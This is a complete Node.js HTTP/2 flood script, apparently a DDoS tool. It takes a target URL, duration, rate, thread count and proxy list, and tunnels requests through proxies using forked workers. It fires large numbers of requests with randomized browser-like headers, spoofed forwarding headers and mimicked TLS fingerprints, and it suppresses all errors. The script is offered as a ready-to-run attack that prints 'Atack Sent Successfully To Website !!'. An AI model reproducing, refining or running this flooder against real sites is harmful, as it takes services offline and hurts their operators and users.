
process.on('uncaughtException', function(er) {
    //console.log(er);
});
process.on('unhandledRejection', function(er) {
    //console.log(er);
});

process.on("SIGHUP", () => {
    return 1;
  })
process.on("SIGCHILD", () => {
    return 1;
  });

require("events").EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);
const gradient = require('gradient-string');
const cluster = require("cluster");
const crypto = require("crypto");
const http2 = require("http2");
const http = require('http');
const net = require("net");
const tls = require("tls");
const url = require("url");
const fs = require("fs");
var path = require("path");
var colors = require('colors');
var fileName = __filename;
var file = path.basename(fileName);

if (process.argv.length < 7){
    console.log('node ' + file + ' <url> <time> <requests> <threads> <proxy> ( options: <cookie> )'.rainbow); 
    process.exit();
}

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
defaultCiphers[2],
defaultCiphers[1],
defaultCiphers[0],
defaultCiphers.slice(3) 
].join(":");

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
const secureOptions = 
crypto.constants.SSL_OP_NO_SSLv2 |
crypto.constants.SSL_OP_NO_SSLv3 |
crypto.constants.SSL_OP_NO_TLSv1 |
crypto.constants.SSL_OP_NO_TLSv1_1 |
crypto.constants.ALPN_ENABLED |
crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
crypto.constants.SSL_OP_COOKIE_EXCHANGE |
crypto.constants.SSL_OP_PKCS1_CHECK_1 |
crypto.constants.SSL_OP_PKCS1_CHECK_2 |
crypto.constants.SSL_OP_SINGLE_DH_USE |
crypto.constants.SSL_OP_SINGLE_ECDH_USE |
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";
const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

const headers = {};
 function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 

 function randomCharacters(length) {
    output = ""
    for (let count = 0; count < length; count++) {
        output += randomElement(characters);
    }
    return output;
}
 
const args = {
    target: process.argv[2],
    time: process.argv[3],
    rate: process.argv[4],
    threads: process.argv[5],
    proxy: process.argv[6],
    cookie: process.argv[7] || undefined
 }

const accept_header = [
    '*/*',
    'text/html',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',
    'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/plain, */*; q=0.01',
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded",
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json",
          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml",
              "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css",
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
                  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd",
                      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv",
                        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*',
    'text/html, application/xhtml+xml, image/jxr, */*',
    'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1',
    'application/javascript, */*;q=0.8',
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel",
    'text/html, text/plain; q=0.6, */*; q=0.1',
    'application/graphql, application/json; q=0.8, application/xml; q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
]

const uas = [
        "POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1",
            "POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1",
                "portalmmm/2.0 N410i(c20;TB) ",
                    "Python-urllib/2.5",
                        "SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3",
                            "SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
                                "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)",
                                    "SearchExpress",
                                        "SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)",
                                            "SEC-SGHX210/1.0 UP.Link/6.3.1.13.0",
                                                "SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
                                                    "SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0",
                                                        "SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
                                                            "SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
                                                                "SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
                                                                    "SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
                                                                        "SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
                                                                            "SonyEricssonT100/R101",
                                                                                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0",
                                                                                    "Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.6.30 Version/10.61",
                                                                                        "Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00",
                                                                                            "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10",
                                                                                                "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01",
                                                                                                    "Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10",
                                                                                                        "Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30",
                                                                                                            "SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0",
                                                                                                                "SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
                                                                                                                    "SonyEricssonT68/R201A",
                                                                                                                        "SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
                                                                                                                            "SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
                                                                                                                                "SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
                                                                                                                                    "SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]",
                                                                                                                                        "SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
                                                                                                                                            "SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
                                                                                                                                                "HTC_HD2_T8585 Opera/9.70 (Windows NT 5.1; U; de)",
                                                                                                                                                    "BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102",
                                                                                                                                                        "BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123",
                                                                                                                                                            "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",
                                                                                                                                                                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0",
                                                                                                                                                                    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.7",
                                                                                                                                                                        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.70',
                                                                                                                                                                            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.36',
                                                                                                                                                                                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0',
                                                                                                                                                                                    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.40',
                                                                                                                                                                                        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.45',
                                                                                                                                                                                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
                                                                                                                                                                                                'Opera/5.0 (compatible; Windows NT 6.9; en-us) Gecko/20180224 Chrome/35.1.271.187 Safari/592.28',
                                                                                                                                                                                                  
                                                                                                                                                                                                      'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                                                                                                                                                                                                          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
                                                                                                                                                                                                              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
                                                                                                                                                                                                                  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
                                                                                                                                                                                                                      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                                                                                                                                                                                                                          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
                                                                                                                                                                                                                              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                                                                                                                                                                                                                                  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
                                                                                                                                                                                                                                      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
                                                                                                                                                                                                                                          'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
                                                                                                                                                                                                                                              'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                                                                                                                                                                                                                                                  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
                                                                                                                                                                                                                                                      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
                                                                                                                                                                                                                                                          'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
                                                                                                                                                                                                                                                            ];

cache_header = [
    'max-age=0',
    'no-cache',
    'no-store', 
    'must-revalidate',
    'proxy-revalidate'
],
language_header = [
    'ru-RU,ru;q=0.9',
    'ru-RU,ru;q=0.8',
    'ru-RU,ru;q=0.7',
    'ru-RU,ru;q=0.6',
    'ru-RU,ru;q=0.5',
    'en-US,en;q=0.9', 
    'en-US,en;q=0.8', 
    'en-US,en;q=0.7', 
    'en-US,en;q=0.6', 
    'en-US,en;q=0.5', 
      'fr-FR,fr;q=0.9',
        'ga-IE,ga;q=0.9',
          'gl-ES,gl;q=0.9',
            'gu-IN,gu;q=0.9',
              'he-IL,he;q=0.9',
                'hi-IN,hi;q=0.9',
                  'hr-HR,hr;q=0.9',
                    'hu-HU,hu;q=0.9',
                      'hy-AM,hy;q=0.9',
                        'id-ID,id;q=0.9',
                          'is-IS,is;q=0.9',
                            'it-IT,it;q=0.9',
                              'ja-JP,ja;q=0.9',
                                'ka-GE,ka;q=0.9',
                                  'kk-KZ,kk;q=0.9',
                                    'km-KH,km;q=0.9',
                                      'kn-IN,kn;q=0.9',
                                        'ko-KR,ko;q=0.9',
                                          'ky-KG,ky;q=0.9',
                                            'lo-LA,lo;q=0.9',
                                              'lt-LT,lt;q=0.9',
                                                'lv-LV,lv;q=0.9',
                                                  'mk-MK,mk;q=0.9',
                                                    'ml-IN,ml;q=0.9',
                                                      'mn-MN,mn;q=0.9',
                                                        'mr-IN,mr;q=0.9',
                                                          'ms-MY,ms;q=0.9',
                                                            'mt-MT,mt;q=0.9',
                                                              'my-MM,my;q=0.9',
                                                                'nb-NO,nb;q=0.9',
                                                                  'ne-NP,ne;q=0.9',
                                                                    'nl-NL,nl;q=0.9',
                                                                      'nn-NO,nn;q=0.9',
                                                                        'or-IN,or;q=0.9',
                                                                          'pa-IN,pa;q=0.9',
                                                                            'pl-PL,pl;q=0.9',
                                                                              'pt-BR,pt;q=0.9',
                                                                                'pt-PT,pt;q=0.9',
                                                                                  'ro-RO,ro;q=0.9',
                                                                                    'ru-RU,ru;q=0.9',
                                                                                      'si-LK,si;q=0.9',
                                                                                        'sk-SK,sk;q=0.9',
                                                                                          'sl-SI,sl;q=0.9',
                                                                                            'sq-AL,sq;q=0.9',
                                                                                              'sr-Cyrl-RS,sr;q=0.9',
                                                                                                'sr-Latn-RS,sr;q=0.9',
                                                                                                  'sv-SE,sv;q=0.9',
                                                                                                    'sw-KE,sw;q=0.9',
                                                                                                      'ta-IN,ta;q=0.9',
                                                                                                        'te-IN,te;q=0.9',
                                                                                                          'th-TH,th;q=0.9',
                                                                                                            'tr-TR,tr;q=0.9',
                                                                                                              'uk-UA,uk;q=0.9',
                                                                                                                'ur-PK,ur;q=0.9',
                                                                                                                  'uz-Latn-UZ,uz;q=0.9',
                                                                                                                    'vi-VN,vi;q=0.9',
                                                                                                                      'zh-CN,zh;q=0.9',
                                                                                                                        'zh-HK,zh;q=0.9',
                                                                                                                          'zh-TW,zh;q=0.9',
                                                                                                                            'am-ET,am;q=0.8',
                                                                                                                              'as-IN,as;q=0.8',
                                                                                                                                'az-Cyrl-AZ,az;q=0.8',
                                                                                                                                  'bn-BD,bn;q=0.8',
                                                                                                                                    'bs-Cyrl-BA,bs;q=0.8',
                                                                                                                                      'bs-Latn-BA,bs;q=0.8',
                                                                                                                                        'dz-BT,dz;q=0.8',
                                                                                                                                          'fil-PH,fil;q=0.8',
                                                                                                                                            'fr-CA,fr;q=0.8',
                                                                                                                                              'fr-CH,fr;q=0.8',
                                                                                                                                                'fr-BE,fr;q=0.8',
                                                                                                                                                  'fr-LU,fr;q=0.8',
                                                                                                                                                    'gsw-CH,gsw;q=0.8',
                                                                                                                                                      'ha-Latn-NG,ha;q=0.8',
                                                                                                                                                        'hr-BA,hr;q=0.8',
                                                                                                                                                          'ig-NG,ig;q=0.8',
                                                                                                                                                            'ii-CN,ii;q=0.8',
                                                                                                                                                              'is-IS,is;q=0.8',
                                                                                                                                                                'jv-Latn-ID,jv;q=0.8',
                                                                                                                                                                  'ka-GE,ka;q=0.8',
                                                                                                                                                                    'kkj-CM,kkj;q=0.8',
                                                                                                                                                                      'kl-GL,kl;q=0.8',
                                                                                                                                                                        'km-KH,km;q=0.8',
                                                                                                                                                                          'kok-IN,kok;q=0.8',
                                                                                                                                                                            'ks-Arab-IN,ks;q=0.8',
                                                                                                                                                                              'lb-LU,lb;q=0.8',
                                                                                                                                                                                'ln-CG,ln;q=0.8',
                                                                                                                                                                                  'mn-Mong-CN,mn;q=0.8',
                                                                                                                                                                                    'mr-MN,mr;q=0.8',
                                                                                                                                                                                      'ms-BN,ms;q=0.8',
                                                                                                                                                                                        'mt-MT,mt;q=0.8',
                                                                                                                                                                                          'mua-CM,mua;q=0.8',
                                                                                                                                                                                            'nds-DE,nds;q=0.8',
                                                                                                                                                                                              'ne-IN,ne;q=0.8',
                                                                                                                                                                                                'nso-ZA,nso;q=0.8',
                                                                                                                                                                                                  'oc-FR,oc;q=0.8',
                                                                                                                                                                                                    'pa-Arab-PK,pa;q=0.8',
                                                                                                                                                                                                      'ps-AF,ps;q=0.8',
                                                                                                                                                                                                        'quz-BO,quz;q=0.8',
                                                                                                                                                                                                          'quz-EC,quz;q=0.8',
                                                                                                                                                                                                            'quz-PE,quz;q=0.8',
                                                                                                                                                                                                              'rm-CH,rm;q=0.8',
                                                                                                                                                                                                                'rw-RW,rw;q=0.8',
                                                                                                                                                                                                                  'sd-Arab-PK,sd;q=0.8',
                                                                                                                                                                                                                    'se-NO,se;q=0.8',
                                                                                                                                                                                                                      'si-LK,si;q=0.8',
                                                                                                                                                                                                                        'smn-FI,smn;q=0.8',
                                                                                                                                                                                                                          'sms-FI,sms;q=0.8',
                                                                                                                                                                                                                            'syr-SY,syr;q=0.8',
                                                                                                                                                                                                                              'tg-Cyrl-TJ,tg;q=0.8',
                                                                                                                                                                                                                                'ti-ER,ti;q=0.8',
                                                                                                                                                                                                                                  'te;q=0.9,en-US;q=0.8,en;q=0.7',
                                                                                                                                                                                                                                    'tk-TM,tk;q=0.8',
                                                                                                                                                                                                                                      'tn-ZA,tn;q=0.8',
                                                                                                                                                                                                                                        'tt-RU,tt;q=0.8',
                                                                                                                                                                                                                                          'ug-CN,ug;q=0.8',
                                                                                                                                                                                                                                            'uz-Cyrl-UZ,uz;q=0.8',
                                                                                                                                                                                                                                              've-ZA,ve;q=0.8',
                                                                                                                                                                                                                                                'wo-SN,wo;q=0.8',
                                                                                                                                                                                                                                                  'xh-ZA,xh;q=0.8',
                                                                                                                                                                                                                                                    'yo-NG,yo;q=0.8',
                                                                                                                                                                                                                                                      'zgh-MA,zgh;q=0.8',
                                                                                                                                                                                                                                                        'zu-ZA,zu;q=0.8',
    '*'
],
dest_header = [
    'audio',
    'audioworklet',
    'document',
    'embed',
    'empty',
    'font',
    'frame',
    'iframe',
    'image',
    'manifest',
    'object',
    'paintworklet',
    'report',
    'script',
    'serviceworker',
    'sharedworker',
    'style',
    'track',
    'video',
    'worker',
    'xslt'
 ],
mode_header = [
    'cors',
    'navigate',
    'no-cors',
    'same-origin',
    'websocket'
 ],
site_header = [
    'cross-site',
    'same-origin',
    'same-site',
    'none'
]

var proxies = readLines(args.proxy);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster){
    const dateObj = new Date();
        for (let i = 0; i < process.argv[5]; i++){
            cluster.fork();
            console.clear()
            console.log('\x1b[38;2;255;0;0m' +  '@KHADEPTRAI20'+ '\x1b[38;2;255;0;0m');
        }
        console.log('\x1b[38;2;255;0;0m' +  'Atack Sent Successfully To Website !!'+ '\x1b[38;2;255;0;0m');
        console.log(`Timestamp: \x1b[37m${dateObj.toDateString()} ${dateObj.toTimeString()}`);
        setTimeout(() => {
        }, process.argv[5] * 1000);
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
        }
    } else {setInterval(runFlooder) }

class NetSocket {
     constructor(){}
 
HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
     const connection = net.connect({
     host: options.host,
     port: options.port,
     allowHalfOpen: true,
     writable: true,
     readable: true
     });
 
     connection.setTimeout(options.timeout * 10000);
     connection.setKeepAlive(true, 10000);
     connection.setNoDelay(true);
     connection.on("connect", () => {
     connection.write(buffer);
     });

     connection.on("data", chunk => {
     const response = chunk.toString("utf-8");
     const isAlive = response.includes("HTTP/1.1 200");
     if (isAlive === false) {
     connection.destroy();
     return callback(undefined, "403");
     }
     return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "403");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "403");
     });
 }}

 const Socker = new NetSocket();
 headers[":method"] = "GET";
 headers[":path"] = parsedTarget.path;
 headers[":scheme"] = "https";
 headers["accept"] = accept_header[Math.floor(Math.random() * accept_header.length)];
 headers["accept-encoding"] = "gzip, deflate, br";
 headers["accept-language"] = language_header[Math.floor(Math.random() * language_header.length)];
 headers["cache-control"] = cache_header[Math.floor(Math.random() * cache_header.length)];
 headers["pragma"] = "no-cache";
 headers["cookie"] = process.argv[7];
 headers["sec-ch-ua"] = '"Chromium";v="108", "Opera GX";v="94", "Not)A;Brand";v="99"';
 headers["sec-ch-ua-mobile"] = "?0";
 headers["sec-ch-ua-platform"] = "Windows";
 headers["sec-fetch-dest"] = dest_header[Math.floor(Math.random() * dest_header.length)];
 headers["sec-fetch-mode"] = mode_header[Math.floor(Math.random() * mode_header.length)];
 headers["sec-fetch-site"] = site_header[Math.floor(Math.random() * site_header.length)];
 headers["sec-fetch-user"] = "?1";
 headers["upgrade-insecure-requests"] = "1";
 headers["user-agent"] =  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0";
 headers["x-requested-with"] = "XMLHttpRequest";

 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     headers[":authority"] = parsedTarget.host
     headers["x-forwarded-for"] = parsedProxy[0];
     headers["x-forwarded-proto"] = "https";
     const proxyOptions = {
     host: parsedProxy[0],
     port: parsedProxy[1],
     address: parsedTarget.host + ":443",
     timeout: 15
     };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
         connection.setKeepAlive(true, 60000);
         connection.setNoDelay(true);

         const settings = {
            enablePush: false,
            initialWindowSize: 1073741823
        };

         const tlsOptions = {
            port: 443,
            ALPNProtocols: [
                "h2" , "http/1.1" , "spdy/3.1"
            ],
            secure: true,
            ciphers: ciphers,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            rejectUnauthorized: false,
            servername: url.hostname,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            secureOptions: secureOptions,
            secureContext: secureContext,
            secureProtocol: secureProtocol
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 
         
         tlsConn.allowHalfOpen = true;
         tlsConn.setNoDelay(true);
         tlsConn.setKeepAlive(true, 60 * 1000);
         tlsConn.setMaxListeners(0);
 
         const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          },
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
         });
 
         client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          });

         client.setMaxListeners(0);
         client.settings(settings);

         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.rate; i++) {
                    const request = client.request(headers)

                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });

                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
 
         client.on("error", error => {
             client.destroy();
             connection.destroy();
             return
         });
     });
 }

 const KillScript = () => process.exit();
 setTimeout(KillScript, args.time * 1000);